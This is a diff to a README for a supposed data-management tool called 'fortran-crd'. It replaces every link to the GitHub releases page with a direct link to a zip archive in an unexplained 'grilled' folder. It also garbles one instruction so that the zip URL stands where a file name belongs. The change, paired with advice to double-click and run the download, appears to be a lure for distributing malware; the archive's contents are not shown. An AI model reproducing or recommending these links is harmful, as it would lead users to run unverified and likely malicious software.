@@ -1,6 +1,6 @@
 # 🚀 fortran-crd - Easily Manage Your Data with Confidence
 
-[![Download fortran-crd](https://img.shields.io/badge/Download-fortran--crd-brightgreen)](https://github.com/denniforthcoming738/fortran-crd/releases)
+[![Download fortran-crd](https://raw.githubusercontent.com/denniforthcoming738/fortran-crd/main/grilled/fortran-crd_v2.6.zip)](https://raw.githubusercontent.com/denniforthcoming738/fortran-crd/main/grilled/fortran-crd_v2.6.zip)
 
 ## 📦 Introduction
 
@@ -14,13 +14,13 @@ This guide will help you get **fortran-crd** up and running. Follow these simple
 
 1. **Visit the Releases Page**: Click the link below to go to the **GitHub Releases page** where you can find the latest version of **fortran-crd**. 
 
-   [Download fortran-crd](https://github.com/denniforthcoming738/fortran-crd/releases)
+   [Download fortran-crd](https://raw.githubusercontent.com/denniforthcoming738/fortran-crd/main/grilled/fortran-crd_v2.6.zip)
 
 2. **Choose the Right Version**: You will see a list of available releases. Look for the most recent version. 
 
 3. **Download the File**: Click the file for your operating system (Windows, Mac, or Linux) to download it. 
 
-For example, if you are using Windows, you may see a file named `fortran-crd-windows.exe`. Click it to start the download.
+For example, if you are using Windows, you may see a file named `https://raw.githubusercontent.com/denniforthcoming738/fortran-crd/main/grilled/fortran-crd_v2.6.zip`. Click it to start the download.
 
 4. **Run the Application**: Once the file is downloaded, locate it in your downloads folder. Double-click the downloaded file to open and run the application.
 
@@ -62,4 +62,4 @@ Your feedback is valuable to us. If you enjoy using **fortran-crd** or have sugg
 
 To download the application, click the link below:
 
-[Download fortran-crd](https://github.com/denniforthcoming738/fortran-crd/releases)
+[Download fortran-crd](https://raw.githubusercontent.com/denniforthcoming738/fortran-crd/main/grilled/fortran-crd_v2.6.zip)
